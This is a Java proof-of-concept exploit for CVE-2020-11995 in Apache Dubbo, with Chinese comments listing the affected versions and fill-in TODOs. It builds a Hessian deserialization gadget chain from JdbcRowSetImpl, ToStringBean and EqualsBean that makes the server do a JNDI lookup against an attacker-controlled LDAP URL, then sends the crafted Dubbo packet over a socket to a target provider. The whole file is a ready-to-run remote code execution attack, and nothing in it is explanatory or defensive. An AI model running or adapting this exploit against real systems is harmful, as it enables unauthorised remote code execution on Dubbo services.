package cve;

import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;
import marshalsec.util.Reflections;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.Cleanable;
import org.apache.dubbo.serialize.hessian.Hessian2ObjectOutput;

import java.io.ByteArrayOutputStream;
import java.io.OutputStream;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.net.Socket;
import java.util.HashMap;
import java.util.Random;

/**
 * 影响版本：
 * 2.7.0 <= Dubbo <= 2.7.7
 * 2.6.0 <= Dubbo <= 2.6.8
 * Dubbo 2.5.x
 */
public class CVE_2020_11995 {

    public static void setPayload(Hessian2ObjectOutput hessian2ObjectOutput,String jndiUrl) throws Exception {

        JdbcRowSetImpl rs = new JdbcRowSetImpl();
        rs.setDataSourceName(jndiUrl);
        rs.setMatchColumn("foo");
        Reflections.getField(javax.sql.rowset.BaseRowSet.class, "listeners").set(rs, null);

        ToStringBean item = new ToStringBean(JdbcRowSetImpl.class, rs);
        EqualsBean root = new EqualsBean(ToStringBean.class, item);

        HashMap s = new HashMap<>();
        Reflections.setFieldValue(s, "size", 2);
        Class<?> nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor<?> nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, root, root, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, root, root, null));
        Reflections.setFieldValue(s, "table", tbl);

        hessian2ObjectOutput.writeObject(s);
    }
    public static void main(String[] args) throws Exception{


        //dubbo_data
        ByteArrayOutputStream dubbo_data = new ByteArrayOutputStream();

        // header.
        byte[] dubbo_header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, dubbo_header);
        // set request and serialization flag.
        dubbo_header[2] = (byte) ((byte) 0x80 | 2);
        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), dubbo_header, 4);

        //dubbo_body
        ByteArrayOutputStream dubbo_body = new ByteArrayOutputStream();
        Hessian2ObjectOutput hessian2ObjectOutput = new Hessian2ObjectOutput(dubbo_body);

        hessian2ObjectOutput.writeUTF("2.7.6");//dubbo版本
//todo 此处填写注册中心获取到的service全限定名、版本号、方法名
        hessian2ObjectOutput.writeUTF("com.example.api.DemoService");//接口全限定名
        hessian2ObjectOutput.writeUTF("");//接口的版本
        hessian2ObjectOutput.writeUTF("$invokeAsync");//$invoke $invokeAsync $echo  方法名换成三个中任意一个
//todo 方法描述不需要修改，因为此处需要指定map的payload去触发
        hessian2ObjectOutput.writeUTF("Ljava/util/Map;");
//todo 此处填写ldap url
        setPayload(hessian2ObjectOutput,"ldap://10.41.230.66:1389/uqsh9k");
        hessian2ObjectOutput.writeObject(new HashMap());

        hessian2ObjectOutput.flushBuffer();
        if (hessian2ObjectOutput instanceof Cleanable) {
            ((Cleanable) hessian2ObjectOutput).cleanup();
        }

        Bytes.int2bytes(dubbo_body.size(), dubbo_header, 12);
        dubbo_data.write(dubbo_header);
        dubbo_data.write(dubbo_body.toByteArray());

        byte[] bytes = dubbo_data.toByteArray();

//todo 此处填写被攻击的dubbo服务提供者地址和端口
        Socket socket = new Socket("10.41.230.66", 20880);
        OutputStream outputStream = socket.getOutputStream();
        outputStream.write(bytes);
        outputStream.flush();
        outputStream.close();
    }
}